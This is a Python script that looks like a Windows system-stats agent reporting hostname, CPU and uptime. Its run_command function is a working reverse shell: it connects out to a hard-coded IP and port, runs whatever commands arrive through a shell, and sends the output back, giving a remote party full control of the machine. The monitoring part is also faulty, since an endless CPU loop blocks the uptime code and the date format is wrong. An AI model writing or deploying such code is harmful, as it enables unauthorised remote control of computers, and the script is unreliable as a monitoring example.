import socket
import os
import subprocess
import psutil
import time
import threading
from queue import Queue
import wmi
from datetime import datetime, timedelta

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

system_data = {"HostName": "", "UpTime": "", "CPU": ""}


def host_name():
    host_name = socket.gethostname()
    system_data["HostName"] = host_name


def get_cpu():
    while True:
        cpu_utilization = psutil.cpu_percent(interval=1)
        system_data["CPU"] = cpu_utilization


def get_uptime():
    c = wmi.WMI()
    while True:
        for os in c.Win32_OperatingSystem():
            time = os.LastBootUpTime.split('.')[0]
            last_boot_time = datetime.strptime(time, '%Y%m%d%I%M%S')
            now = datetime.now()
            uptime = now - last_boot_time
            system_data["UpTime"] = uptime




def run_command():
    s = socket.socket()
    host = '10.42.62.156'
    port = 9999
    s.connect((host, port))

    while True:
        data = s.recv(1028)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            output_byts = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byts, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + "> "))
            print(output_str)


    s.close()

def create_worker():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do the next Job in Queue (1 to handle connection 2 to send commands)

def work():
    while True:
        x = queue.get()
        if x == 1:
            host_name()
            get_cpu()
            get_uptime()
        if x == 2:
            run_command()
        queue.task_done()


# Each list item is a new JOB

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_worker()
create_jobs()


